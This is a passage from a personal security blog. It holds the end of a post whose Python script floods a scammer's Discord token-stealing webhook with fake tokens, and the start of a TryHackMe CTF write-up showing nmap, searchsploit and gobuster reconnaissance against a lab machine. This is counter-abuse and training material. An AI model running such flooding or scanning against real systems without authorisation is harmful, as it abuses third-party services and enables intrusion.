&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Content-Type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;application/json&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&quot;mfa.&quot;&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b64encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;urandom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;=&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;+&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;-&quot;&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b64encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;urandom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;=&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;+&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;-&quot;&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b64encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;urandom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;=&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;+&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;sending fake token: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;webhook&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DiscordWebhook&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'**@everyone made by water** |   {token}'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;webhook&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;What this script does, is generate random fake discord tokens, and send them to the scammer‚Äôs server. :) I made sure to test this script, using a webhook I created for a test server.&lt;/p&gt;

&lt;p&gt;This essentially ruins the scammer‚Äôs operation, because There‚Äôs no way for them to distuinguish real or fake tokens.&lt;/p&gt;

&lt;p&gt;As for how I know it‚Äôs actually being sent to the server, and if the webhook is active- The script prints out the response. I tested if the response is the same once the server is deleted, or once the webhook is deleted- and it turns out you get a 404 if this is the case.&lt;/p&gt;

&lt;p&gt;The response you get from an active webhook should look something like this:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;{&quot;id&quot;: &quot;859572022375088209&quot;, &quot;type&quot;: 0, &quot;content&quot;: &quot;**@everyone made by water** |   {token}&quot;, &quot;channel_id&quot;: &quot;829414545716936774&quot;, &quot;author&quot;: {&quot;bot&quot;: true, &quot;id&quot;: &quot;859395640198692884&quot;, &quot;username&quot;: &quot;Spidey Bot&quot;, &quot;avatar&quot;: null, &quot;discriminator&quot;: &quot;0000&quot;}, &quot;attachments&quot;: [], &quot;embeds&quot;: [], &quot;mentions&quot;: [], &quot;mention_roles&quot;: [], &quot;pinned&quot;: false, &quot;mention_everyone&quot;: true, &quot;tts&quot;: false, &quot;timestamp&quot;: &quot;2021-06-29T23:12:20.210000+00:00&quot;, &quot;edited_timestamp&quot;: null, &quot;flags&quot;: 0, &quot;components&quot;: [], &quot;webhook_id&quot;: &quot;859395640198692884&quot;}&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;As you can see in the response, webhook requests allow us to do a few things, including send attachments, embeds, pin messages, etc..&lt;/p&gt;

&lt;p&gt;Initially I saw &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;bot&quot;: true, &quot;id&quot;: &quot;859395640198692884&quot;&lt;/code&gt; and thought that perhap‚Äôs this was connected to a discord bot that I could invite to a server. So I tried to do so, by copying the invite link for a bot of my own, but simply replacing the ID with the ones seen in the JSON response above. This sadly did not work. If it did however, I would have been able to distinguish the real Tokens sent to the server, and inform the owners of those accounts of the breach&lt;/p&gt;

&lt;p&gt;Next I thought it would be helpful to find out if there are any other people in the server involved with the scam. So I spammed a ton of invites to an empty server I created, in an attempt to find out if there were multiple people involved, that way if there were, all of the accounts could be reported as opposed to just one&lt;/p&gt;

&lt;p&gt;Someone joined the server:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://jambot3000.github.io/assets/images/water-1-joined.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Normally I wouldn‚Äôt dox the user‚Äôs account like this, as I‚Äôd be unsure if it‚Äôs really them. But it soon became clear that this was in fact the scammer:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JamBot3000/jambot3000.github.io/main/assets/images/omg-you-can-spam-a-web-hook.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I made a poor attempt to keep them talking lol. They ended up inviting me to a server, which only intrigued me more, I felt like I was going down some rabbit hole lol. This server turned out to have not much to do with the person‚Äôs operation&lt;/p&gt;

&lt;p&gt;Yea the person made it clear that he was doing some shady business:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://jambot3000.github.io/assets/images/water-profile.png&quot; style=&quot;width:40%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;They also made it clear that they disliked the mysterious person who was sending things to their webhook‚Ä¶ üëÄ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://jambot3000.github.io/assets/images/webhook-spam.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Cool so at this point I had ruined their scam, found out their &lt;em&gt;real&lt;/em&gt; discord account (they were using an alt to avoid getting banned from the platform I assume). Now it was time to report them to discord. Discord actually tends to take stuff relating to account theft pretty seriously ~~a&lt;/p&gt;

&lt;p&gt;I know because after looking into that server, I found multiple other accounts with a similar name as the scammer‚Äôs one, as well as some messages talking about how he gets banned a lot.&lt;/p&gt;

&lt;p&gt;On their &lt;a href=&quot;https://www.youtube.com/channel/UCtV-htHJZZkU7Zkc73asa_w&quot;&gt;youtube channel&lt;/a&gt; which was linked on their instagram account, the scammer showcases some tools, as well as a classic ‚ÄúFREE DISCORD NITRO | NO SURVEY 2021 NO DOWNLOAD‚Äù video lol.&lt;/p&gt;

&lt;p&gt;The tor browser icon can be seen on the desktop in one of the videos- so I assume they have enough knowledge to use either that or a VPN to avoid getting permanently banned from discord. The youtube channel also shows the scammer to be using other alt accounts.&lt;/p&gt;

&lt;h1 id=&quot;a-word-about-discords-security&quot;&gt;A word about discord‚Äôs security&lt;/h1&gt;

&lt;p&gt;So while foiling one scam may have prevented some people from having their accounts stolen or misused- in the long term it doesnt matter because these scams will always be out there. I think this is simpy a matter of discord improvig their security. As far as I know, your account token &lt;em&gt;never&lt;/em&gt; changes, unless you change your password&lt;/p&gt;

&lt;p&gt;see: &lt;a href=&quot;https://twitter.com/discord/status/894750617016520704?lang=en&quot;&gt;https://twitter.com/discord/status/894750617016520704?lang=en&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Now this may be wrong, but I do know for a fact that tokens last several days at the very least, as I have had to use my own to automate some tasks in the past&lt;/p&gt;

&lt;p&gt;In my opinion, it seems extremely important for discord to tighten their security more, perhaps associate tokens with an IP, or have session tokens that change frequently.&lt;/p&gt;

&lt;p&gt;While this won‚Äôt necessarily prevent short term usage of someone‚Äôs account, it will prevent the creation of large account networks that allow attackers to raid servers without being in them, and without using any fake accounts&lt;/p&gt;

&lt;p&gt;What a lot of these scams are meant to do, is not necessarily harvest accounts to be sold, but instead just build up a network of active accounts, that can be used to further spread malicious scripts, files, etc. All potentially without knowledge of the user. A scammer with a collection of tokens could easily write a script to make each user go through every big server they are in, send the same script we seen before, and then block the user so that they can‚Äôt even see that they sent the message.&lt;/p&gt;

&lt;p&gt;As mentioned before, these harvested tokens may also be used to perform large scale server raids- which becomes a big problem when the people who gave their tokens away unknowingly, have privileges in these servers&lt;/p&gt;

&lt;p&gt;While, yes, of course this wouldn‚Äôt be possible if people were better informed- there will always be end users who fall for the simplest of tricks. And I think that discord should definitely attempt to mitigate some of these issues to better improve their platform.&lt;/p&gt;</content><author><name>JamBot</name></author><category term="misc" /><summary type="html">Explanation</summary></entry><entry><title type="html">TryHackMe! year of the jellyfish writeup</title><link href="http://localhost:4000/blog/THM-year-of-the-jellyfish" rel="alternate" type="text/html" title="TryHackMe! year of the jellyfish writeup" /><published>2021-04-29T00:00:00+01:00</published><updated>2021-04-29T00:00:00+01:00</updated><id>http://localhost:4000/blog/THM-year-of-the-jellyfish</id><content type="html" xml:base="http://localhost:4000/blog/THM-year-of-the-jellyfish">&lt;h1 id=&quot;explanation&quot;&gt;Explanation&lt;/h1&gt;

&lt;p&gt;This room was rated the max difficulty. As part of an ongoing competition (ongoing as of now at least), anyone who roots the room before the 30th of april is entered into a raffle, the grand prize being an OSCP certification (you still have to do the exam to get the certification of course). There are also 5 one month tryhackme VIP vouchers up for grabs :)&lt;/p&gt;

&lt;p&gt;No VPN connection was needed to attempt this room as a public IP was used (this may change after the raffle event ends)&lt;/p&gt;

&lt;p&gt;Also, this writeup was made mostly during school, so the IP being scanned may vary throughout the blog - this isn‚Äôt anything to do with the room, don‚Äôt worry&lt;/p&gt;

&lt;h1 id=&quot;nmap&quot;&gt;Nmap&lt;/h1&gt;

&lt;p&gt;Okay first thing‚Äôs first- we need to get some idea of what we should do. We wanna find services being run, their versions, any information that may be helpful in exploiting the machine.&lt;/p&gt;

&lt;p&gt;As this was rated a hard machine, I wanted to make sure that I didn‚Äôt skip over anything.&lt;/p&gt;

&lt;p&gt;Because of this, I wanted to use &lt;a href=&quot;https://github.com/robertdavidgraham/masscan&quot;&gt;massscan&lt;/a&gt; as it‚Äôs an awesome tool that can scan every port that could possibly be open on the machine, in less than a second.&lt;/p&gt;

&lt;p&gt;given the following warning, I thought it‚Äôd be best not to unless I found absolutely nothing on the running services I find with nmap- it also implies that we likely don‚Äôt need to enumerate extremely agressively to find the vulnerable services.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Be warned ‚Äì this box deploys with a public IP. Think about what that means for how you should approach this challenge. ISPs are often unhappy if you enumerate public IP addresses at a high speed‚Ä¶&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;We still need to get an idea of the services running however, so here‚Äôs how port scanning/service enumeration went:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;‚îå‚îÄ[jambot3000@pop-os:~/Desktop/challenges/tryhackme/year_of_the_jellyfish]
‚îî‚îÄ‚ïº &amp;gt;  cat nmap.log
# Nmap 7.80 scan initiated Mon Apr 26 11:21:58 2021 as: nmap -sC -sV -oN nmap.log 34.253.235.12
Nmap scan report for ec2-34-253-235-12.eu-west-1.compute.amazonaws.com (34.253.235.12)
Host is up (0.069s latency).
Not shown: 995 filtered ports
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.3
22/tcp   open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|_  2048 46:b2:81:be:e0:bc:a7:86:39:39:82:5b:bf:e5:65:58 (RSA)
80/tcp   open  http     Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Did not follow redirect to https://robyns-petshop.thm/
443/tcp  open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Robyn&amp;amp;#039;s Pet Shop
| ssl-cert: Subject: commonName=robyns-petshop.thm/organizationName=Robyns Petshop/stateOrProvinceName=South West/countryName=GB
| Subject Alternative Name: DNS:robyns-petshop.thm, DNS:monitorr.robyns-petshop.thm, DNS:beta.robyns-petshop.thm, DNS:dev.robyns-petshop.thm
| Not valid before: 2021-04-26T10:18:59
|_Not valid after:  2022-04-26T10:18:59
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
8000/tcp open  http-alt
| fingerprint-strings:
|   GenericLines:
|     HTTP/1.1 400 Bad Request
|     Content-Length: 15
|_    Request
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.80%I=7%D=4/26%Time=6086945B%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,3F,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x2
SF:015\r\n\r\n400\x20Bad\x20Request&quot;);
Service Info: Host: robyns-petshop.thm; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Apr 26 11:22:46 2021 -- 1 IP address (1 host up) scanned in 47.67 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Okay nice, we found a bunch of stuff; service names, versions, subdomains on the http(s) server. There‚Äôs a lot to comb through in search of vunlerabilities now.&lt;/p&gt;

&lt;h1 id=&quot;ftp&quot;&gt;FTP&lt;/h1&gt;

&lt;p&gt;First let‚Äôs investigate that ftp service, I know from past experience that there are some vulnerable versions of vsftpd but which are they?&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/offensive-security/exploitdb&quot;&gt;searchsploit&lt;/a&gt; is an awesome tool that let‚Äôs us find CVE‚Äôs based on the naes of services we give it.&lt;/p&gt;

&lt;p&gt;Here is an example of that:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;‚îå‚îÄ[jambot3000@pop-os:~/Desktop/challenges/tryhackme/year_of_the_jellyfish]
‚îî‚îÄ‚ïº &amp;gt;  searchsploit vsftpd
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                     |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
vsftpd 2.0.5 - 'CWD' (Authenticated) Remote Memory Consumption                                                                                                                     | linux/dos/5814.pl
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (1)                                                                                                                     | windows/dos/31818.sh
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (2)                                                                                                                     | windows/dos/31819.pl
vsftpd 2.3.2 - Denial of    Service                                                                                                                                                   | linux/dos/16270.c
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                                                                             | unix/remote/17491.rb
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The version of vsftpd we found to be running on the machine was version 3.0.3 - so there don‚Äôt appear to be any major exploits for this version (at least not in exploitdb).&lt;/p&gt;

&lt;p&gt;I would normally do some more research to ensure there are no CVE‚Äôs, however I know that this version isn‚Äôt vulnerable to anything that may help us. Nmap would have shown if anonymous access was enabled, and we should only try to brute force as a last resort if we don‚Äôt find anything.&lt;/p&gt;

&lt;p&gt;That‚Äôs all for FTP&lt;/p&gt;

&lt;h1 id=&quot;ssh&quot;&gt;SSH&lt;/h1&gt;

&lt;p&gt;This actually caught my eye at first, because I know this isn‚Äôt the latest version of SSH, back to searchsploit!&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;‚îå‚îÄ[jambot3000@pop-os:~/Desktop/challenges/tryhackme/year_of_the_jellyfish]
‚îî‚îÄ‚ïº &amp;gt;  searchsploit openSSH 5.9
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                     |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenSSH 2.3 &amp;lt; 7.7 - Username Enumeration                                                                                                                                           | linux/remote/45233.py
OpenSSH 2.3 &amp;lt; 7.7 - Username Enumeration (PoC)                                                                                                                                     | linux/remote/45210.py
OpenSSH &amp;lt; 6.6 SFTP (x64) - Command Execution                                                                                                                                       | linux_x86-64/remote/45000.c
OpenSSH &amp;lt; 6.6 SFTP - Command Execution                                                                                                                                             | linux/remote/45001.pycEscalation                                                                               | linux/local/40962.txt
OpenSSH &amp;lt; 7.4 - agent Protocol Arbitrary Library Loading                                                                                                                           | linux/remote/40963.txt
OpenSSH &amp;lt; 7.7 - User Enumeration (2)                                                                                                                                               | linux/remote/45939.py
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Username enumeration and command execution looked very promising, however we already know 2 what 2 of the usernames are likely to be. ‚Äúrobyn‚Äù (name of the site) and ‚Äúroot‚Äù Of course.&lt;/p&gt;

&lt;p&gt;Sadly, neither of the exploits worked- if you want to try them for yourself, and have exploitdb installed- they should be located at &lt;code class=&quot;highlighter-rouge&quot;&gt;/opt/exploitdb/exploits/&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Once again, as a last resort, we could try bruteforcing SSH- bubt for now let‚Äôs keep enumerating.&lt;/p&gt;

&lt;h1 id=&quot;https-servers&quot;&gt;HTTP(s) servers&lt;/h1&gt;

&lt;h2 id=&quot;port-80&quot;&gt;Port 80&lt;/h2&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;‚îå‚îÄ[jambot3000@pop-os:~]
‚îî‚îÄ‚ïº &amp;gt;  curl 52.48.139.223
&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;302 Found&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;Found&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;p&amp;gt;&lt;/span&gt;The document has moved &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://robyns-petshop.thm/&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;here&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;.&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;hr&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;address&amp;gt;&lt;/span&gt;Apache/2.4.29 (Ubuntu) Server at 52.48.139.223 Port 80&lt;span class=&quot;nt&quot;&gt;&amp;lt;/address&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Okay so port 80 is just a redirect to the https site. If we want to access this site, or any of the subdomains we seen before in our nmap scan, we must first add the following to our &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; file&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;52.48.139.223	robyns-petshop.thm
52.48.139.223	monitorr.robyns-petshop.thm
52.48.139.223	beta.robyns-petshop.thm
52.48.139.223	dev.robyns-petshop.thm
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Before I moved on to investigate the main site and the subdomains- I made sure to quickly attempt to enumerate some hidden directories or files, incase I missed any useful findings. It‚Äôs worth noting that the files and directories of a subdomain aren‚Äôt necessarily the same as the main site.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;‚îå‚îÄ[jambot3000@pop-os:~]
‚îî‚îÄ‚ïº &amp;gt;  gobuster -u http://52.48.139.223 -w /usr/dirb/wordlists/big.txt -q
2021/04/29 13:19:24 [-] Wildcard response found: http://52.48.139.223/2213c90a-85b6-4c29-a998-1f6ab682e6cf =&amp;gt; 302
2021/04/29 13:19:24 [!] To force processing of Wildcard responses, specify the '-fw' switch.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So it looks like no matter what directory we try to access, we get a 302. This ie because whenever you try to go to a directory or file on port 80, it will try to redirect you to the main site + &lt;code class=&quot;highlighter-rouge&quot;&gt;/whatever_you_requested&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;port-443&quot;&gt;Port 443&lt;/h2&gt;

&lt;p&gt;So, we didn‚Äôt really find much on port 80, because everything seemed to redirect here. Let‚Äôs just go to the site I guess :p&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://jambot3000.github.io/assets/images/firefox-security-risk-ahead.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see, firefox presents us with a warning - this is just because the SSL certificate in use here is self signed. There isn‚Äôt any actual security risk for us, so long as we don‚Äôt plan on sending any personal data to the machine lol.&lt;/p&gt;

&lt;p&gt;All we have to do is accept the risk and continue. Also, if for some reason we didn‚Äôt find the subdomains through nmap, the SSL information from firefox would have shown us.&lt;/p&gt;

&lt;p&gt;:)&lt;/p&gt;

&lt;h3 id=&quot;robyns-petshopthm&quot;&gt;robyns-petshop.thm&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://robyns-petshop.thm&quot;&gt;https://robyns-petshop.thm&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;This is the first site, no subdomain. On the site, there isn‚Äôt much of interest. There are pictures of animals which have names- which could be worth noting incase for some reason we need to bruteforce, or guess a username&lt;/p&gt;

&lt;p&gt;We also know that the site is using PicoCMS:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://jambot3000.github.io/assets/images/jellyfish-footer.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If we click the link in this footer, we are taken to &lt;a href=&quot;https://github.com/picocms/Pico/graphs/contributors&quot;&gt;https://github.com/picocms/Pico/graphs/contributors&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;So now, we look for known vulnerabilities in the pico CMS.&lt;/p&gt;

